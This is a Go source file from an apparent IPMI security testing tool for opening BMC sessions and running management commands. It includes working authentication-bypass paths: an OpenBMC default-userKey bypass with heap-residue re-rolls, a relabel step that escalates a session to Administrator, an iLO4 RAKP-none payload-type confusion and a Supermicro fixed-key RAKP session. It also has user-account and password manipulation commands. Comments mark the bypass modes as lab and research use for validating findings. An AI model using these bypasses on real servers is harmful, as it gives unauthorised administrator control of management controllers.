package ipmi

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"slices"
	"strconv"
	"strings"
	"time"
)

// Bounds for the --openbmc-bmcrand miss rescan: on a RAKP4 stale-value mismatch,
// try +/- openBMCBypassRescanPages neighbouring heap pages at the same in-page
// offset, and cycle the constant-string residues openBMCBypassRescanStringRetries
// times (they recur on only a fraction of sessions). ~1 + 2*64 + 5*8 = 169 fresh
// sessions worst case before giving up.
const (
	openBMCBypassRescanPages         = 64
	openBMCBypassRescanStringRetries = 8
)

// parseOpenBMCBMCRand parses the operator-supplied stale bmcRandomNum for the
// OpenBMC default-userKey bypass (--openbmc-bmcrand). It ignores an optional
// "0x" prefix and any spaces, colons, dashes, or underscores, and accepts
// either a full 16-byte value (32 hex digits, used verbatim) or a 4-byte heap
// pointer (8 hex digits, written as a normal address) wrapped into the observed
// residue layout 00000000 <ptr little-endian> 00000000 65000000.
func parseOpenBMCBMCRand(s string) ([]byte, error) {
	clean := strings.Map(func(r rune) rune {
		switch r {
		case ' ', ':', '-', '_', '\t':
			return -1
		}
		return r
	}, strings.TrimSpace(s))
	clean = strings.TrimPrefix(strings.TrimPrefix(clean, "0x"), "0X")
	if clean == "" {
		return nil, fmt.Errorf("--openbmc-bmcrand: empty value")
	}
	raw, err := hex.DecodeString(clean)
	if err != nil {
		return nil, fmt.Errorf("--openbmc-bmcrand: not valid hex: %w", err)
	}
	switch len(raw) {
	case 16:
		return raw, nil
	case 4:
		addr := binary.BigEndian.Uint32(raw)
		c := make([]byte, 16)
		binary.LittleEndian.PutUint32(c[4:8], addr)
		c[12] = 0x65
		return c, nil
	default:
		return nil, fmt.Errorf("--openbmc-bmcrand: expected 4 bytes (heap pointer) or 16 bytes (full bmcRandomNum), got %d", len(raw))
	}
}

const (
	// Transport-netfn command IDs used by ipmitool-like operations.
	CmdSetSOLConfigParams byte = 0x21
	CmdGetSOLConfigParams byte = 0x22

	// App-netfn command IDs used by ipmitool-like operations.
	CmdMasterWriteRead byte = 0x52
)

// CmdSessOptions controls authenticated command sessions for ad-hoc IPMI
// operations (similar to ipmitool lan/lanplus workflows).
type CmdSessOptions struct {
	Host           string
	Port           int
	Username       string
	Password       string
	Timeout        time.Duration
	MaxRetries     int    // number of timed-out request attempts before failing
	IPMIVersion    string // 2, 2.0, 1, or 1.5
	Auth           string // none|md2|md5|password (v1.5)
	Cipher         int    // -1 = auto select, 0 = none/none/none
	DisableSMCRAKP bool
	// ForceSMCRAKP, when true, skips detection and directly opens the session
	// with the SMCRAKP fixed key. Use for boards locked in the RAKP4 0x08 state
	// where the detection probe cannot run (the board won't produce a valid
	// RAKP2 hash while the session slot is locked).
	ForceSMCRAKP bool
	// OpenBMCRelabel, when non-empty, names an enabled administrator account to
	// write into the active session with a second sessionless RAKP Message 1,
	// raising it to that account's authorization without the
	// administrator password. It composes with OpenBMCBMCRand (bypass first,
	// then relabel). These modes are lab/research only, not scanner defaults.
	OpenBMCRelabel string
	// OpenBMCBMCRand, when non-empty, opens the session using the OpenBMC
	// default-userKey authentication bypass with this stale
	// bmcRandomNum instead of a password. It accepts a full 16-byte value (32 hex
	// digits) or a 4-byte heap pointer (8 hex digits, wrapped into the residue
	// layout).
	OpenBMCBMCRand string
	// OpenBMCBypassFast, when true, opens the session via the seedless OpenBMC
	// default-userKey fast path: no stale value is required, the known
	// constant-string residues are re-rolled (with grooming) until one activates.
	// It composes with OpenBMCRelabel. Ignored when OpenBMCBMCRand is set (a
	// supplied seed is the targeted retest and takes precedence).
	OpenBMCBypassFast bool
	// OpenBMCFastRounds bounds the fast path's residue re-rolls; 0 = default.
	OpenBMCFastRounds int
	// ILORAKPNone, when true, opens the session via the iLO4 RAKP-none
	// payload-type-confusion bypass (no password; only an enabled username, which
	// defaults to "Administrator"). IPMI 2.0 only.
	ILORAKPNone bool
	// CommandProtection selects the wire protection for in-session commands:
	// "" or "auto" (cleartext-first with negotiated fallback), "cleartext"
	// (force the H3 payload-type-0x00 path), or "negotiated" (spec-correct
	// integrity+confidentiality per the negotiated suite). Applies to 2.0 only.
	CommandProtection string
}

// parseCommandProtection maps a user-facing protection selector to the internal
// strategy. An empty value defaults to the cleartext-first auto strategy.
func parseCommandProtection(v string) (commandProtection, error) {
	switch strings.TrimSpace(strings.ToLower(v)) {
	case "", "auto":
		return protectionAuto, nil
	case "cleartext", "clear", "plain":
		return protectionCleartext, nil
	case "negotiated", "negotiate", "integrity", "encrypted", "spec":
		return protectionNegotiated, nil
	default:
		return protectionAuto, fmt.Errorf("unsupported --proto %q (use auto, cleartext, or negotiated)", v)
	}
}

// CommandProtection reports the wire protection actually used for in-session
// commands on this session ("cleartext", "integrity+conf", "none", or "auto").
func (s *CmdSess) CommandProtection() string {
	if s == nil {
		return ""
	}
	if s20, ok := s.runner.(*Session20); ok {
		return s20.CommandProtectionUsed()
	}
	return s.commandProtection
}

// CmdSess wraps an authenticated 1.5/2.0 command runner and exposes
// common operations used by responders validating findings.
type CmdSess struct {
	runner            cmdRunner
	flow              AuthFlow
	advertisedCiphers []int
	smcrakpDetected   bool
	commandProtection string // latched at Close so it survives runner teardown
	host              string // target host, for artifact naming / connect helpers
}

// Host returns the target host this session was opened against.
func (s *CmdSess) Host() string {
	if s == nil {
		return ""
	}
	return s.host
}

// Flow returns the negotiated/auth-selected flow details.
func (s *CmdSess) Flow() AuthFlow {
	if s == nil {
		return AuthFlow{}
	}
	return s.flow
}

// AdvertisedCiphers returns the target's advertised cipher IDs observed during
// auto-selection (if any).
func (s *CmdSess) AdvertisedCiphers() []int {
	if s == nil || len(s.advertisedCiphers) == 0 {
		return nil
	}
	out := make([]int, len(s.advertisedCiphers))
	copy(out, s.advertisedCiphers)
	return out
}

// SMCRAKPDetected reports whether fixed-key SMCRAKP was identified during the
// pre-session RAKP probe for this target.
func (s *CmdSess) SMCRAKPDetected() bool {
	if s == nil {
		return false
	}
	return s.smcrakpDetected
}

// Close tears down the authenticated session.
func (s *CmdSess) Close() {
	if s == nil || s.runner == nil {
		return
	}
	if s20, ok := s.runner.(*Session20); ok {
		s.commandProtection = s20.CommandProtectionUsed()
	}
	s.runner.Close()
	s.runner = nil
}

// OpenCmdSess establishes a command-capable authenticated IPMI session.
func OpenCmdSess(opts CmdSessOptions) (*CmdSess, error) {
	host := strings.TrimSpace(opts.Host)
	if host == "" {
		return nil, fmt.Errorf("host is required")
	}
	if opts.Port <= 0 {
		opts.Port = DefaultPort
	}
	if opts.Timeout <= 0 {
		opts.Timeout = 5 * time.Second
	}
	if opts.MaxRetries <= 0 {
		opts.MaxRetries = 1
	}
	version := normalizeIPMIVersion(opts.IPMIVersion)
	if version == "" {
		return nil, fmt.Errorf("unsupported --ipmi-version %q (use 1.5 or 2.0)", opts.IPMIVersion)
	}
	prot, err := parseCommandProtection(opts.CommandProtection)
	if err != nil {
		return nil, err
	}

	if version == "1.5" {
		if strings.TrimSpace(opts.OpenBMCRelabel) != "" || strings.TrimSpace(opts.OpenBMCBMCRand) != "" {
			return nil, fmt.Errorf("--openbmc-relabel and --openbmc-bmcrand are only valid with IPMI 2.0")
		}
		if opts.ILORAKPNone {
			return nil, fmt.Errorf("--ilo-rakp-none is only valid with IPMI 2.0")
		}
		authType, mode, err := parseV15AuthType(opts.Auth)
		if err != nil {
			return nil, err
		}
		flow := AuthFlow{
			Version:  "1.5",
			Mode:     mode,
			Username: opts.Username,
			Password: opts.Password,
			AuthType: authType,
			Source:   "cli.ipmi",
		}
		if authType == IPMI15AuthNone {
			flow.Username = ""
			flow.Password = ""
		} else if strings.TrimSpace(flow.Username) == "" {
			return nil, fmt.Errorf("--user is required for IPMI 1.5 auth mode %q", opts.Auth)
		}
		r, err := openRunner(host, opts.Port, flow, opts.Timeout, prot)
		if err != nil {
			return nil, err
		}
		if r15, ok := r.(*v15Runner); ok && r15 != nil {
			r15.cmdRetries = opts.MaxRetries
		}
		return &CmdSess{runner: r, flow: flow, host: host}, nil
	}

	suite, ciphers, err := chooseCipherSuite(host, opts.Port, opts.Timeout, opts.Cipher, false)
	if err != nil {
		return nil, err
	}
	relabelUser := strings.TrimSpace(opts.OpenBMCRelabel)
	bypassHex := strings.TrimSpace(opts.OpenBMCBMCRand)
	flow := AuthFlow{
		Version:  "2.0",
		Mode:     "cred",
		Username: opts.Username,
		Password: opts.Password,
		Suite:    suite,
		Source:   "cli.ipmi",
	}
	if suite.Auth == RAKPNone {
		flow.Mode = "cipherZero"
	}

	// OpenBMC default-userKey bypass: open the session passwordlessly, optionally
	// chaining a relabel to reach administrator. A supplied stale value
	// (--openbmc-bmcrand) is a targeted retest and takes precedence; otherwise the
	// seedless fast path re-rolls the constant-string residues with grooming.
	if bypassHex != "" || opts.OpenBMCBypassFast {
		var s20 *Session20
		var err error
		if bypassHex != "" {
			staleBMCRand, perr := parseOpenBMCBMCRand(bypassHex)
			if perr != nil {
				return nil, perr
			}
			// On a stale-value miss (rakp4=0x0f -- the residue drifted or varies
			// per session), retry nearby heap pages at the same in-page offset and
			// the constant-string residues before giving up.
			s20, err = OpenSession20OpenBMCBypassRescan(host, opts.Port, opts.Username, staleBMCRand, suite, opts.Timeout,
				openBMCBypassRescanPages, openBMCBypassRescanStringRetries, nil)
		} else {
			// Seedless fast path: no value to supply, just open sessions and
			// re-roll the residues (grooming to manufacture the log-template one)
			// until one activates. This is the scanner's default confirmation
			// path, exposed on the CLI.
			s20, err = OpenSession20OpenBMCBypassFast(OpenBMCBypassFastOptions{
				Host: host, Port: opts.Port, Username: opts.Username,
				Suite: suite, Timeout: opts.Timeout, Rounds: opts.OpenBMCFastRounds,
			})
		}
		if err != nil {
			return nil, fmt.Errorf("openbmc default-userKey bypass: %w", err)
		}
		s20.cmdRetries = opts.MaxRetries
		flow.Mode = "openbmcBypass"
		flow.Password = ""
		flow.Source = "cli.openBmcBypass"
		if s20.username != "" {
			flow.Username = s20.username
		}
		if relabelUser != "" {
			if rr, relabelErr := s20.RelabelActiveSession(relabelUser, 0x04); relabelErr != nil {
				s20.Close()
				return nil, fmt.Errorf("openbmc bypass relabel RAKP1: %w", relabelErr)
			} else if rr == nil || rr.ErrorCode != 0 {
				s20.Close()
				if rr != nil {
					return nil, fmt.Errorf("openbmc bypass relabel RAKP1 status=0x%02x", rr.ErrorCode)
				}
				return nil, fmt.Errorf("openbmc bypass relabel RAKP1 failed")
			}
			// The relabel RAKP1 only rewrites the session identity and
			// reqMaxPrivLevel; the passwordless session's current privilege stays at
			// the CALLBACK level the early-exit left, so admin commands would be
			// refused (cc=0xd4). Raise operational privilege to Administrator over the
			// original (passwordless) session keys, which still validate because the
			// relabel does not reinstall the integrity/confidentiality algorithms.
			if at, praiseErr := s20.RequestSessionPrivilege(0x04); praiseErr != nil {
				s20.Close()
				return nil, fmt.Errorf("openbmc bypass relabel set-priv: %w", praiseErr)
			} else if !at.Success {
				s20.Close()
				return nil, fmt.Errorf("openbmc bypass relabel set-priv cc=0x%02x (session did not escalate to Administrator)", at.CC)
			}
			flow.Mode = "openbmcBypassRelabel"
			flow.RelabelUser = relabelUser
			flow.Source = "cli.openBmcBypassRelabel"
		}
		return &CmdSess{runner: s20, flow: flow, advertisedCiphers: ciphers, host: host}, nil
	}

	// iLO4 RAKP-none payload-type-confusion bypass: open a passwordless session by
	// declaring the authentication algorithm record as payload-type 0x02 with
	// algo 0, which evades iLO4's auth-algo-0 reject guard while positionally
	// setting the authentication algorithm to NONE. Only an enabled username is
	// needed (default "Administrator"); the session is driveable in cleartext and
	// raised to Administrator via Set Session Privilege Level.
	if opts.ILORAKPNone {
		user := strings.TrimSpace(opts.Username)
		if user == "" {
			user = "Administrator"
		}
		s20, ierr := OpenSession20ILORAKPNone(host, opts.Port, user, 0x04, opts.Timeout)
		if ierr != nil {
			return nil, fmt.Errorf("ilo rakp-none bypass: %w", ierr)
		}
		s20.cmdRetries = opts.MaxRetries
		flow.Mode = "iloRakpNone"
		flow.Password = ""
		flow.Source = "cli.iloRakpNone"
		if s20.username != "" {
			flow.Username = s20.username
		}
		return &CmdSess{runner: s20, flow: flow, advertisedCiphers: ciphers, host: host}, nil
	}

	if flow.Mode == "cred" && suite.Auth != RAKPNone && strings.TrimSpace(flow.Username) == "" {
		return nil, fmt.Errorf("--user is required for authenticated IPMI 2.0 sessions")
	}
	r, err := openRunner(host, opts.Port, flow, opts.Timeout, prot)
	// When the BMC will not answer Get Channel Cipher Suites there is nothing to
	// select from, so chooseCipherSuite guesses suite 17. Every iLO 4 rejects it
	// (status 0x05, no SHA-256) and the single attempt used to end there, which
	// looked like a credential failure. Walk down to the SHA-1 suites instead.
	if err != nil && opts.Cipher < 0 && len(ciphers) == 0 && openSessionAlgoRejected(err) {
		for _, sid := range blindCipherFallback {
			ca, ok := CipherAlgosFor(sid)
			if !ok || ca == suite {
				continue
			}
			flow.Suite = ca
			r, err = openRunner(host, opts.Port, flow, opts.Timeout, prot)
			if err == nil {
				suite = ca
				break
			}
			if !openSessionAlgoRejected(err) {
				break
			}
		}
		if err != nil {
			flow.Suite = suite
		}
	}
	if err == nil {
		if relabelUser != "" {
			s20, ok := r.(*Session20)
			if !ok || s20 == nil {
				r.Close()
				return nil, fmt.Errorf("--openbmc-relabel requires an IPMI 2.0 session")
			}
			if rr, relabelErr := s20.RelabelActiveSession(relabelUser, 0x04); relabelErr != nil {
				r.Close()
				return nil, fmt.Errorf("openbmc relabel RAKP1: %w", relabelErr)
			} else if rr == nil || rr.ErrorCode != 0 {
				r.Close()
				if rr != nil {
					return nil, fmt.Errorf("openbmc relabel RAKP1 status=0x%02x", rr.ErrorCode)
				}
				return nil, fmt.Errorf("openbmc relabel RAKP1 failed")
			}
			// Raise operational privilege to Administrator after the relabel (the
			// relabel RAKP1 rewrites identity/reqMaxPrivLevel but not the session's
			// current privilege); the original session keys still validate.
			if at, praiseErr := s20.RequestSessionPrivilege(0x04); praiseErr != nil {
				r.Close()
				return nil, fmt.Errorf("openbmc relabel set-priv: %w", praiseErr)
			} else if !at.Success {
				r.Close()
				return nil, fmt.Errorf("openbmc relabel set-priv cc=0x%02x (session did not escalate to Administrator)", at.CC)
			}
			flow.Mode = "openbmcRelabel"
			flow.RelabelUser = relabelUser
			flow.Source = "cli.openBmcRelabel"
		}
		if s20, ok := r.(*Session20); ok && s20 != nil {
			s20.cmdRetries = opts.MaxRetries
		}
		return &CmdSess{runner: r, flow: flow, advertisedCiphers: ciphers, host: host}, nil
	}
	if opts.DisableSMCRAKP || !isRAKPAuthFailure(err) {
		return nil, err
	}
	// ForceSMCRAKP skips the RAKP-hash detection (which cannot run on a board
	// whose record-0 session slot is locked: RAKP4 returns 0x08 before any hash
	// is produced) and opens the fixed-key session directly.
	if !opts.ForceSMCRAKP && !detectSMCRAKPFixedKey(host, opts.Port, opts.Timeout, opts.Username) {
		return nil, err
	}

	smSuite, smCiphers, smErr := chooseCipherSuite(host, opts.Port, opts.Timeout, opts.Cipher, true)
	if smErr != nil {
		return nil, smErr
	}
	smFlow := AuthFlow{
		Version:  "2.0",
		Mode:     "smcrakpFixedKey",
		Username: opts.Username,
		Password: "",
		Suite:    smSuite,
		Source:   "cli.ipmi",
	}
	if strings.TrimSpace(smFlow.Username) == "" {
		smFlow.Username = "ADMIN"
	}
	r, err = openRunner(host, opts.Port, smFlow, opts.Timeout, prot)
	if err != nil {
		return nil, err
	}
	if s20, ok := r.(*Session20); ok && s20 != nil {
		s20.cmdRetries = opts.MaxRetries
	}
	return &CmdSess{runner: r, flow: smFlow, advertisedCiphers: smCiphers, smcrakpDetected: true, host: host}, nil
}

// blindCipherFallback is the order to try when the BMC would not enumerate its
// cipher suites, so the first choice was a guess. SHA-256 first (suite 17, then
// 3 with SHA-1 integrity), then the SHA-1 suites older BMCs actually implement.
var blindCipherFallback = []int{3, 2, 1}

// openSessionAlgoRejected reports whether a session open failed because the BMC
// refused one of the proposed algorithms, rather than because of credentials or
// the network. These are the RMCP+ Table 13-15 codes that mean "renegotiate":
// invalid authentication (0x04), integrity (0x05) or confidentiality (0x10)
// algorithm, and no cipher suite match (0x11).
func openSessionAlgoRejected(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	if !strings.Contains(msg, "open-session rejected") {
		return false
	}
	for _, code := range []string{"status=0x04", "status=0x05", "status=0x10", "status=0x11"} {
		if strings.Contains(msg, code) {
			return true
		}
	}
	return false
}

func isRAKPAuthFailure(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "rakp4 status=0x08") || strings.Contains(msg, "rakp4 status=0x09")
}

func detectSMCRAKPFixedKey(host string, port int, timeout time.Duration, username string) bool {
	users := []string{username, "ADMIN", "admin", "root", ""}
	seenUsers := map[string]struct{}{}
	algos := []byte{RAKPHMACSHA1, RAKPHMACSHA256, RAKPHMACMD5}
	for _, u := range users {
		u = strings.TrimSpace(u)
		if _, ok := seenUsers[u]; ok {
			continue
		}
		seenUsers[u] = struct{}{}
		for _, algo := range algos {
			r, err := DoRAKP12(host, port, u, algo, IntegrityNone, ConfNone, timeout)
			if err != nil || r == nil || len(r.RAKPHash) == 0 {
				continue
			}
			if r.UsesSMCRAKPFixedKey() {
				return true
			}
		}
	}
	return false
}

func normalizeIPMIVersion(v string) string {
	v = strings.TrimSpace(strings.ToLower(v))
	if v == "" || v == "2" || v == "2.0" {
		return "2.0"
	}
	if v == "1" || v == "1.5" {
		return "1.5"
	}
	return ""
}

func parseV15AuthType(v string) (byte, string, error) {
	v = strings.TrimSpace(strings.ToLower(v))
	if v == "" {
		return IPMI15AuthMD5, "cred", nil
	}
	switch v {
	case "none":
		return IPMI15AuthNone, "authNone", nil
	case "md2":
		return IPMI15AuthMD2, "cred", nil
	case "md5":
		return IPMI15AuthMD5, "cred", nil
	case "password", "straight":
		return IPMI15AuthPass, "cred", nil
	default:
		return 0, "", fmt.Errorf("unsupported --auth %q (use none, md2, md5, or password)", v)
	}
}

func chooseCipherSuite(host string, port int, timeout time.Duration, requested int, smcrakp bool) (CipherAlgos, []int, error) {
	if requested >= 0 {
		if requested == 0 {
			return CipherAlgos{Suite: 0, Auth: RAKPNone, Integrity: IntegrityNone, Conf: ConfNone}, nil, nil
		}
		if ca, ok := CipherAlgosFor(requested); ok {
			return ca, nil, nil
		}
		return CipherAlgos{}, nil, fmt.Errorf("unsupported cipher suite id %d", requested)
	}

	ids, _, err := EnumCipherSuites15(host, port, timeout)
	if err != nil || len(ids) == 0 {
		if smcrakp {
			if ca, ok := CipherAlgosFor(1); ok {
				return ca, nil, nil
			}
		}
		if ca, ok := CipherAlgosFor(17); ok {
			return ca, nil, nil
		}
		if ca, ok := CipherAlgosFor(3); ok {
			return ca, nil, nil
		}
		return CipherAlgos{}, nil, fmt.Errorf("no usable cipher suite available")
	}

	pref := []int{17, 3, 16, 2, 1, 8, 7, 6, 12, 11, 15, 4, 5, 9, 10, 13, 14, 18, 19}
	if smcrakp {
		// Prefer unauthenticated/no-integrity suites for known SMCRAKP workflows.
		pref = []int{1, 6, 15, 16, 17, 3, 2, 7, 8, 11, 12, 4, 5, 9, 10, 13, 14, 18, 19}
	}
	for _, sid := range pref {
		if !slices.Contains(ids, sid) {
			continue
		}
		if ca, ok := CipherAlgosFor(sid); ok {
			return ca, ids, nil
		}
	}
	for _, sid := range ids {
		if ca, ok := CipherAlgosFor(sid); ok {
			return ca, ids, nil
		}
	}
	return CipherAlgos{}, ids, fmt.Errorf("target advertised unsupported ciphers: %v", ids)
}

// ExecRaw executes an arbitrary NetFn/Cmd request payload.
func (s *CmdSess) ExecRaw(netfn, cmd byte, req []byte) (byte, []byte, error) {
	if s == nil || s.runner == nil {
		return 0xff, nil, fmt.Errorf("session closed")
	}
	return s.runner.Exec(netfn, cmd, req)
}

// MCInfo returns parsed Management Controller identity info.
func (s *CmdSess) MCInfo(ctx context.Context) (*MCInfo, error) {
	return collectMCInfo(ctx, s.runner)
}

// ChassisStatus returns parsed chassis state.
func (s *CmdSess) ChassisStatus(ctx context.Context) (*ChassisStatus, error) {
	return collectChassisStatus(ctx, s.runner)
}

// MCReset requests a management controller reset.
func (s *CmdSess) MCReset(cold bool) error {
	cmd := CmdWarmReset
	if cold {
		cmd = CmdColdReset
	}
	cc, _, err := s.runner.Exec(NetFnApp, cmd, nil)
	if err != nil {
		return err
	}
	if cc != 0x00 {
		return fmt.Errorf("mc reset cc=0x%02x", cc)
	}
	return nil
}

// UserList returns parsed user slots.
func (s *CmdSess) UserList(ctx context.Context) ([]UserEntry, error) {
	return collectUsers(ctx, s.runner)
}

// LANPrint returns LAN and LAN6 maps.
func (s *CmdSess) LANPrint(ctx context.Context) (map[string]string, map[string]string, error) {
	return collectLAN(ctx, s.runner)
}

// GetLANMAC returns the BMC's LAN MAC address as a string in
// xx:xx:xx:xx:xx:xx format, queried via Get LAN Configuration Parameters
// (NetFn Transport, Cmd 0x02, param 5). It returns an error if the query
// fails or the MAC is invalid.
func (s *CmdSess) GetLANMAC(ctx context.Context) (string, error) {
	if s == nil || s.runner == nil {
		return "", fmt.Errorf("session closed")
	}
	ch := selectLANChannel(ctx, s.runner)
	cc, data, err := s.runner.Exec(NetFnTransport, CmdGetLANConfigParams, []byte{ch, 5, 0x00, 0x00})
	if err != nil {
		return "", fmt.Errorf("GetLANConfig param 5: %w", err)
	}
	if cc != 0x00 {
		return "", fmt.Errorf("GetLANConfig param 5 cc=0x%02x", cc)
	}
	if len(data) < 7 { // 1 byte completion code + 6 bytes MAC
		return "", fmt.Errorf("GetLANConfig param 5 short reply (%d bytes)", len(data))
	}
	mac := fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x",
		data[1], data[2], data[3], data[4], data[5], data[6])
	if !ValidateSMCX14MAC(mac) {
		return "", fmt.Errorf("GetLANConfig param 5 returned invalid MAC %q", mac)
	}
	return mac, nil
}

// FRUPrint returns parsed FRU fields.
func (s *CmdSess) FRUPrint(ctx context.Context, maxFields int) ([]FRUField, error) {
	if maxFields <= 0 {
		maxFields = 64
	}
	return collectFRUDevice(ctx, s.runner, 0, maxFields)
}

// UserSetName updates the username in a user slot.
func (s *CmdSess) UserSetName(id int, name string) error {
	uid, err := parseUserID(id)
	if err != nil {
		return err
	}
	req := make([]byte, 17)
	req[0] = uid
	copy(req[1:], []byte(name))
	cc, _, err := s.runner.Exec(NetFnApp, CmdSetUserName, req)
	if err != nil {
		return err
	}
	if cc != 0x00 {
		return fmt.Errorf("set-user-name cc=0x%02x", cc)
	}
	return nil
}

// UserSetPassword updates a slot password (16-byte mode, ipmitool-compatible).
func (s *CmdSess) UserSetPassword(id int, password string) error {
	uid, err := parseUserID(id)
	if err != nil {
		return err
	}
	if len(password) > 16 {
		return fmt.Errorf("password too long for 16-byte IPMI set-user-password mode")
	}
	req := []byte{uid, 0x02}
	pw := make([]byte, 16)
	copy(pw, []byte(password))
	req = append(req, pw...)
	cc, _, err := s.runner.Exec(NetFnApp, CmdSetUserPassword, req)
	if err != nil {
		return err
	}
	if cc != 0x00 {
		return fmt.Errorf("set-user-password cc=0x%02x", cc)
	}
	return nil
}

// UserEnable enables a user slot.
func (s *CmdSess) UserEnable(id int) error { return s.userEnableDisable(id, true) }

// UserDisable disables a user slot.
func (s *CmdSess) UserDisable(id int) error { return s.userEnableDisable(id, false) }

func (s *CmdSess) userEnableDisable(id int, enable bool) error {
	uid, err := parseUserID(id)
	if err != nil {
		return err
	}
	op := byte(0x00)
	if enable {
		op = 0x01
	}
	cc, _, err := s.runner.Exec(NetFnApp, CmdSetUserPassword, []byte{uid, op})
	if err != nil {
		return err
	}
	if cc != 0x00 {
		return fmt.Errorf("set-user-enable cc=0x%02x", cc)
	}
	return nil
}

// UserSetPrivilege updates a user's channel privilege.
func (s *CmdSess) UserSetPrivilege(ctx context.Context, id int, priv byte) error {
	uid, err := parseUserID(id)
	if err != nil {
		return err
	}
	if priv > 0x0f {
		return fmt.Errorf("privilege must be in range 0-15")
	}
	ch := selectLANChannel(ctx, s.runner)
	if err := s.setUserAccessBestEffort(ch, uid, priv); err != nil {
		return err
	}
	return nil
}

// UserClear disables an account and clears its user name.
func (s *CmdSess) UserClear(ctx context.Context, id int) error {
	if err := s.UserDisable(id); err != nil {
		return err
	}
	if err := s.UserSetName(id, ""); err != nil {
		return err
	}
	if err := s.UserSetPrivilege(ctx, id, 0x0f); err != nil {
		return err
	}
	return nil
}

func (s *CmdSess) setUserAccessBestEffort(ch, uid, priv byte) error {
	chVariants := []byte{ch, byte(ch | 0x80), byte(ch | 0x40), byte(ch | 0xc0)}
	accessVariants := []byte{
		byte(0x30 | (priv & 0x0f)),
		byte(0x34),
		byte(0x70 | (priv & 0x0f)),
		byte(0x74),
		byte(0x3f),
	}
	var lastErr error
	for _, cv := range chVariants {
		for _, av := range accessVariants {
			req := []byte{cv, uid, av, 0x00}
			cc, _, err := s.runner.Exec(NetFnApp, CmdSetUserAccess, req)
			if err != nil {
				lastErr = err
				continue
			}
			if cc != 0x00 {
				lastErr = fmt.Errorf("set-user-access cc=0x%02x", cc)
				continue
			}
			cc, d, err := s.runner.Exec(NetFnApp, CmdGetUserAccess, []byte{ch, uid})
			if err == nil && cc == 0x00 && len(d) >= 4 {
				acc := d[3]
				if (acc & 0x0f) == (priv & 0x0f) {
					return nil
				}
			}
		}
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("set-user-access failed")
	}
	return lastErr
}

func parseUserID(id int) (byte, error) {
	if id < 1 || id > 63 {
		return 0, fmt.Errorf("user id must be 1-63")
	}
	return byte(id), nil
}

// I2CMasterWriteRead executes the App/0x52 Master Write-Read command.
// Request format follows ipmitool i2c conventions:
// [channel][slaveAddr][readCount][writeData...]
func (s *CmdSess) I2CMasterWriteRead(channel, slaveAddr, readCount byte, writeData []byte) ([]byte, error) {
	req := []byte{channel, slaveAddr, readCount}
	req = append(req, writeData...)
	cc, d, err := s.runner.Exec(NetFnApp, CmdMasterWriteRead, req)
	if err != nil {
		return nil, err
	}
	if cc != 0x00 {
		return nil, fmt.Errorf("master-write-read cc=0x%02x", cc)
	}
	return d, nil
}

// SPDRead performs a simple SPD EEPROM read via I2C master write-read.
func (s *CmdSess) SPDRead(slaveAddr, offset, length byte) ([]byte, error) {
	return s.I2CMasterWriteRead(0x0e, slaveAddr, length, []byte{offset})
}

// SOLGetConfigParam reads a SOL configuration parameter from the active LAN channel.
func (s *CmdSess) SOLGetConfigParam(ctx context.Context, param byte) ([]byte, error) {
	ch := selectLANChannel(ctx, s.runner)
	restore := applyFastSOLOptionalProbe(s.runner, param)
	defer restore()
	cc, d, err := s.runner.Exec(NetFnTransport, CmdGetSOLConfigParams, []byte{ch, param, 0x00, 0x00})
	if err != nil {
		return nil, err
	}
	if cc != 0x00 {
		return nil, fmt.Errorf("get-sol-config cc=0x%02x", cc)
	}
	if len(d) >= 1 {
		return append([]byte(nil), d[1:]...), nil
	}
	return nil, nil
}

func applyFastSOLOptionalProbe(r cmdRunner, param byte) func() {
	if param != 9 && param != 10 {
		return func() {}
	}
	s20, ok := r.(*Session20)
	if !ok || s20 == nil || s20.client == nil {
		return func() {}
	}
	prevRetries := s20.cmdRetries
	prevTimeout := s20.client.Timeout
	if prevTimeout <= 0 {
		prevTimeout = 5 * time.Second
	}
	shortTimeout := min(prevTimeout, time.Second)
	s20.cmdRetries = 1
	s20.client.Timeout = shortTimeout
	return func() {
		s20.cmdRetries = prevRetries
		s20.client.Timeout = prevTimeout
	}
}

// SOLSetConfigParam sets a SOL configuration parameter on the active LAN channel.
func (s *CmdSess) SOLSetConfigParam(ctx context.Context, param byte, value []byte) error {
	ch := selectLANChannel(ctx, s.runner)
	req := []byte{ch, param, 0x00}
	req = append(req, value...)
	cc, _, err := s.runner.Exec(NetFnTransport, CmdSetSOLConfigParams, req)
	if err != nil {
		return err
	}
	if cc != 0x00 {
		return fmt.Errorf("set-sol-config cc=0x%02x", cc)
	}
	return nil
}

// SOLActivate sends Activate Payload for SOL and returns the response bytes.
func (s *CmdSess) SOLActivate() ([]byte, error) {
	// payloadType=0x01(SOL), payloadInstance=0x01, aux bytes reserved.
	cc, d, err := s.runner.Exec(NetFnApp, CmdActivatePayload, []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00})
	if err != nil {
		return nil, err
	}
	if cc != 0x00 {
		return nil, fmt.Errorf("activate-sol cc=0x%02x", cc)
	}
	return d, nil
}

// SOLDeactivate sends Deactivate Payload for SOL.
func (s *CmdSess) SOLDeactivate() error {
	cc, _, err := s.runner.Exec(NetFnApp, CmdDeactivatePayload, []byte{0x01, 0x01, 0x00, 0x00})
	if err != nil {
		return err
	}
	if cc != 0x00 {
		return fmt.Errorf("deactivate-sol cc=0x%02x", cc)
	}
	return nil
}

// ParsePrivilege parses privilege strings accepted by user set priv.
func ParsePrivilege(v string) (byte, error) {
	v = strings.TrimSpace(strings.ToLower(v))
	switch v {
	case "callback", "cb":
		return 0x01, nil
	case "user":
		return 0x02, nil
	case "operator", "op":
		return 0x03, nil
	case "admin", "administrator":
		return 0x04, nil
	case "oem":
		return 0x05, nil
	case "noaccess", "none", "off":
		return 0x0f, nil
	default:
		n, err := strconv.Atoi(v)
		if err != nil || n < 0 || n > 15 {
			return 0, fmt.Errorf("invalid privilege %q", v)
		}
		return byte(n), nil
	}
}
